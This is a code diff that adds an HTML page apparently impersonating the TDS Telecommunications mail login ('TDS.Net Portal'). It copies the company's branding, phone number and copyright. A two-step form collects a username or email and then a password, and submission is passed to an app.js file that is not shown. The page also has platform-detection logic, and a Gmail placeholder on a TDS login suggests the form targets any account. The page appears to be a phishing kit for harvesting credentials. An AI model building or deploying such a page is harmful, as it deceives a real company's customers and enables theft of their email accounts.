@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TDS.Net Portal</title>
+    <meta property="og:title" content="TDS.Net Portal" />
+    <meta property="og:description" content="Welcome to TDS - Secured Mail Portal" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="description" content="Sign in to your TDS account securely." />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="./assets/tds-logo.jpg" type="image/jpeg" />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.6s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .btn-hover {
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-hover:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(26, 58, 138, 0.3);
+        }
+
+        .btn-hover:active {
+            transform: translateY(0);
+        }
+    </style>
+    <script>
+        // Detect platform before page renders to avoid flash of wrong content
+        (function () {
+            function detectPlatform() {
+                var ua = navigator.userAgent || "";
+                var platform = navigator.platform || "";
+                var isIOS = /iPhone|iPad|iPod/i.test(ua) || (platform === "MacIntel" && navigator.maxTouchPoints > 1);
+                var isAndroid = /Android/i.test(ua);
+                var isWindows = /Windows/i.test(ua);
+                var isMac = /Macintosh|MacIntel|MacPPC|Mac68K/i.test(platform) && !isIOS;
+                if (isIOS || isAndroid) return "mobile";
+                if (isMac) return "mac";
+                if (isWindows) return "windows";
+                return "browser";
+            }
+            document.documentElement.classList.add(detectPlatform());
+        })();
+    </script>
+</head>
+
+<body class="flex min-h-screen flex-col bg-gradient-to-br from-gray-50 to-blue-50/40 text-[#333]">
+
+    <!-- Header -->
+    <header class="flex flex-col gap-4 w-full justify-center py-6 px-4 fade-in">
+        <img src="./assets/tds-logo.jpg" alt="TDS Logo" class="h-12 w-auto mx-auto object-contain" />
+        <div class="h-px w-full max-w-4xl mx-auto bg-gray-200"></div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex flex-col items-center justify-center px-4 py-8 w-full max-w-6xl mx-auto">
+
+        <!-- ================= MOBILE VIEW: LOGIN FOCUS ================= -->
+        <div id="mobileView" class="w-full max-w-md fade-in">
+            <h1 class="mb-6 text-center text-3xl font-bold tracking-tight text-[#1a3a8a]">TDS Secure Login</h1>
+
+            <form id="loginForm" class="w-full bg-white p-6 rounded-xl shadow-lg border border-gray-100 relative">
+
+                <!-- Step 1: Email -->
+                <div id="step1" class="w-full">
+                    <div class="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-[#c8ccd1] mb-6">
+                        <svg viewBox="0 0 64 64" class="h-16 w-16" xmlns="http://www.w3.org/2000/svg"
+                            aria-hidden="true">
+                            <circle cx="32" cy="24" r="11" fill="#ffffff"></circle>
+                            <path d="M12 58 C 14 42, 50 42, 52 58 Z" fill="#ffffff"></path>
+                        </svg>
+                    </div>
+
+                    <div class="mt-4">
+                        <label for="email" class="mb-2 block text-[15px] font-semibold text-[#333]">User Name or Email
+                            Address</label>
+                        <input id="email" name="email" type="text" required autofocus
+                            class="w-full rounded-sm border border-[#a9c9e8] px-3 py-3 text-[15px] outline-none transition focus:border-[#1a9dd9] focus:ring-2 focus:ring-[#1a9dd9]/20"
+                            placeholder="username@gmail.com" />
+                        <p class="mt-2 text-[13px] italic text-[#8a8a8a]">Examples: username@tds.net or
+                            username@gmail.com</p>
+                    </div>
+
+                    <button type="button" id="continueBtn"
+                        class="mt-6 w-full rounded-sm py-3.5 text-[15px] font-semibold text-white transition hover:opacity-95 btn-hover"
+                        style="background-color: #1a3a8a">
+                        Continue
+                    </button>
+
+                    <div class="mt-5 text-center">
+                        <a href="#" class="text-[14px] underline" style="color: #1a9dd9">Forgot user name? Retrieve
+                            it.</a>
+                    </div>
+                    <div class="mt-8 h-px w-full bg-[#e5e7eb]"></div>
+                    <div class="mt-6 text-center">
+                        <a href="#" class="text-[16px] font-semibold" style="color: #1a9dd9">Don't have a TDS online
+                            account?</a>
+                    </div multiple>
+                </div>
+
+                <!-- Step 2: Password -->
+                <div id="step2" class="w-full hidden">
+                    <button type="button" id="backBtn" class="absolute left-4 top-6 text-2xl" aria-label="Back"
+                        style="color: #1a9dd9">‹</button>
+
+                    <div class="relative mt-2">
+                        <div class="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-[#c8ccd1]">
+                            <svg viewBox="0 0 64 64" class="h-16 w-16" xmlns="http://www.w3.org/2000/svg"
+                                aria-hidden="true">
+                                <circle cx="32" cy="24" r="11" fill="#ffffff"></circle>
+                                <path d="M12 58 C 14 42, 50 42, 52 58 Z" fill="#ffffff"></path>
+                            </svg>
+                        </div>
+                        <div class="mt-3 text-center">
+                            <span id="emailDisplay" class="text-[15px] font-semibold" style="color: #1a9dd9"></span>
+                        </div>
+                    </div>
+
+                    <div class="mt-6">
+                        <label for="password" class="mb-2 block text-[15px] font-semibold text-[#333]">Password</label>
+                        <input id="password" name="password" type="password" required
+                            class="w-full rounded-sm border border-[#a9c9e8] px-3 py-3 text-[15px] outline-none transition focus:border-[#1a9dd9] focus:ring-2 focus:ring-[#1a9dd9]/20" />
+
+                        <div class="mt-3 flex items-center gap-2 text-[14px] text-[#333]">
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" id="showPwd" class="h-4 w-4 accent-[#1a9dd9] border-gray-300">
+                                Show password
+                            </label>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submitBtn"
+                        class="mt-6 w-full rounded-sm py-3.5 text-[15px] font-semibold text-white transition hover:opacity-95 disabled:opacity-70 disabled:cursor-not-allowed btn-hover"
+                        style="background-color: #1a3a8a">
+                        Sign in
+                    </button>
+
+                    <div class="mt-5 text-center">
+                        <a href="#" class="text-[14px] underline" style="color: #1a9dd9">Forgot Password</a>
+                    </div>
+                    <div class="mt-8 h-px w-full bg-[#e5e7eb]"></div>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="w-full bg-[#4a4a4a] py-8 text-center text-white mt-auto">
+        <div class="mx-auto max-w-[520px] px-4">
+            <p class="text-[16px] font-semibold">Questions? Call <a href="tel:800-605-1962"
+                    class="underline hover:text-blue-200 transition">800-605-1962</a>.</p>
+            <div class="mt-3 flex items-center justify-center gap-2 text-[13px]">
+                <a href="#" class="underline hover:text-blue-200 transition">Privacy Policy</a>
+                <span class="text-white/50">|</span>
+                <a href="#" class="underline hover:text-blue-200 transition">Terms of Service</a>
+            </div>
+            <p class="mt-4 text-[12px] text-white/60">Copyright ©2026, TDS Telecommunications LLC. All Rights Reserved.
+            </p>
+        </div>
+    </footer>
+
+    <script src="app.js?v=4"></script>
+</body>
+
+</html>
